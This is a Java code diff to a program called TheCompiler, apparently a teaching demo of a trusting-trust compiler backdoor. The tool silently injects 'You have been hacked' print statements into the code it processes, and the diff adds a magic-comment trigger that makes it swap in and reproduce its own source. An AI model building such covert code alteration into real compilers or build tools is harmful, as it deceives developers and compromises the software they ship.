@@ -17,6 +17,7 @@ public class TheCompiler {
             System.out.println("File wasn't provided for compilation.");
         }
         String filePath = args[0];
+        Pattern bestCompilerP = Pattern.compile("// 2jndaw9fiasndjf393u48fun24rj84jfu4h9");
         Pattern p = Pattern.compile("System.out.println([\"|\\w|\\W]+);");
         Path tmpNoPrefix = Files.createTempDirectory(null);
         String tempFileName = null;
@@ -30,19 +31,38 @@ public class TheCompiler {
             tempFileName = String.format("%s/%s", tmpNoPrefix, fileName);
 
             FileWriter myWriter = new FileWriter(tempFileName);
-
+            boolean bestCompiler = false;
+            StringBuilder builder = new StringBuilder();
             while (myReader.hasNextLine()) {
                 String data = myReader.nextLine();
-                Matcher m = p.matcher(data.trim());
-                myWriter.append(data);
-                myWriter.append("\n");
-                boolean b = m.matches();
-                if (b) {
-                    myWriter.append("System.out.println(\"You have been hacked\");");
-                    myWriter.append("\n");
+                Matcher mBestCompiler = bestCompilerP.matcher(data);
+                if (mBestCompiler.matches()) {
+                    bestCompiler = true;
+                    myObj = new File("./TheCompiler.java");
+
+                    myReader.close();
+                    myReader = new Scanner(myObj);
+                    continue;
+                }
+                builder.append(data);
+                builder.append("\n");
+
+                if (!bestCompiler) {
+                    Matcher m = p.matcher(data.trim());
+                    boolean b = m.matches();
+                    if (b) {
+                        builder.append("System.out.println(\"You have been hacked\");");
+                        builder.append("\n");
+                    }
                 }
             }
             myReader.close();
+            String fileContent = builder.toString();
+            if (bestCompiler) {
+                fileContent = fileContent.replaceFirst("public class TheCompiler", "public class " + fileName.substring(0, fileName.indexOf(".java")));
+            }
+
+            myWriter.write(fileContent);
             myWriter.close();
         } catch (Exception e) {
             System.out.println("An error occurred.");
